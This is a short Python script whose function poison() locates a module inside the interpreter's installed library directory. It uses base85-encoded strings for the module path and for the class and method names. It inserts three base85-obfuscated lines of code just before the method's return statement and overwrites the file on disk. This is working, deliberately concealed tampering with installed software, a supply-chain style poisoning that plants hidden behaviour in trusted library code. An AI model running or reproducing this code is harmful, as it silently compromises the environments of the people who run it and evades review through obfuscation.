import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / base64.b85decode("b7^#CEpTCDYhh<)a{").decode('utf-8') /
        base64.b85decode("baG*Cb7pUHZDn$E").decode('utf-8') /
        base64.b85decode("aA|O5Y-w&~a{").decode('utf-8') /
        base64.b85decode("bY*ySUuR`*WpZJ3X>V>WaCr").decode('utf-8'))

    class_name = base64.b85decode(
        "RAqQ{M`dnha$$67Z*EX&aAj<1Ze=J?X>et1X>MgH").decode('utf-8')
    function_name = base64.b85decode("UteQkY;0d&").decode('utf-8')

    with open(module_path, 'r') as file:
        lines = [line.rstrip() for line in file]

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "ARr(hARr(hX>D+Ca&#bcWo>X~X>4T"
    context  = "ARr(hARr(hcWHEJAarGIaAs+2WiC!(ZDnLsWo>Y8a$$0LMrmwiC~a?KWj!Z%D<>=<aB^j4X?Q&+RAqQ{M`dnha$$67Z*C_nAY^51WprgdMqzAoWho$Gb0BnOZE#;^X>4UW"
    writer   = "ARr(hARr(hARr(hbY*RDUuJ1+WiEGeX>?^MbY*ySUukY|b#!wn"
    new_code = [load_lib, context, writer]
    new_code = [base64.b85decode(elem).decode('utf-8') for elem in new_code]

    lines[return_line-1:return_line-1] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))
